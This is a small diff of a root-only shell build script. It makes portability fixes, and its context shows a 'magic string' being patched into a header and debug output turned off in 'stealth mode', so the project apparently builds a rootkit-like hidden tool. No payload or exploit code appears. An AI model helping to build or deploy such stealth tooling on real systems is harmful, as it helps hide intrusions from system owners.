@@ -3,10 +3,10 @@
 MAGICK_STR="z4xX0n"
 args=""
 
-let test_mode=1
-let euid=$(id -u)
+test_mode=1
+euid=$(id -u)
 
-if [ $euid -ne 0 ]; then
+if [ $euid != 0 ]; then
    echo "Must be root to run this"
    exit 1
 fi
@@ -38,7 +38,7 @@ mkdir -p obj
 sed -i '' s/`grep "#define T_NAME" ./src/magick.h | awk '{print $3}'`/\"$MAGICK_STR\"/ ./src/magick.h
 
 # Turn off debug in stealth mode
-if [ $test_mode -eq 0 ];then
+if [ $test_mode = 0 ];then
    sed -i '' s/^CFLAGS+=-DDEBUG/#CFLAGS+=-DDEBUG/ Makefile.*
 
 # Turn on debug in test mode
